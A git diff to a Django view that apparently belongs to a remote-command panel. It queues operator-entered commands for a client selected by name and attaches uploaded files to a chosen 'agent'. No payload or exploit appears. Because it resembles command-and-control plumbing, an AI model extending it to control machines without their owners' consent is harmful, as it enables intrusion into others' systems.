@@ -9,6 +9,7 @@ import string
 from .models import *
 from django.views.generic import View
 import re
+from .forms import UploadsForm
 
 
 def name_generator(size=6, chars=string.ascii_uppercase + string.digits):
@@ -49,16 +50,30 @@ def create_or_get_user(request):
 class IndexView(View):
     def get(self, request):
         clients = create_or_get_user(request)
+        form = UploadsForm()
         context = {
             'clients': clients,
+            'form': form,
         }
         return render(request, 'server_side/index.html', context)
 
     def post(self, request):
-        clients = create_or_get_user(request).order_by('-last_updated')
+        clients = create_or_get_user(request)
         if self.request.POST.get('command'):
-            Commands.objects.create(receiver=clients[0],
+            client_name = self.request.POST.get('cmd_btn')
+            Commands.objects.create(receiver=clients.filter(name=client_name).first(),
                                     command=self.request.POST.get('command'))
+        if request.FILES:
+            print('file get')
+            form = UploadsForm(request.POST, request.FILES)
+            agent = clients.filter(name=self.request.POST.get('upload_btn')).first()
+            if form.is_valid():
+                upload = form.save(commit=False)
+                if agent:
+                    upload.client = agent
+                    upload.save()
+            else:
+                print(f'file error: {form.errors}')
 
         return redirect('index')
 
